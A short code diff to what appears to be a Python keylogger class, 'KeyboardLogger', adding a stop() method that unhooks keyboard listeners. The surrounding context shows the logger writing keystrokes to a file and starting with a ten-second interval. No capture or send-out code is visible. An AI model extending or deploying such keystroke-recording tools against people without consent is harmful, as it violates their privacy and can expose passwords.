@@ -74,7 +74,10 @@ class KeyboardLogger():
         
         elif self.report_method=='file':
             keyboard.wait()
-
+    
+    def stop(self):
+        keyboard.unhook_all()
+        
 if __name__=='__main__':
     KL = KeyboardLogger(interval=10)
     KL.start()
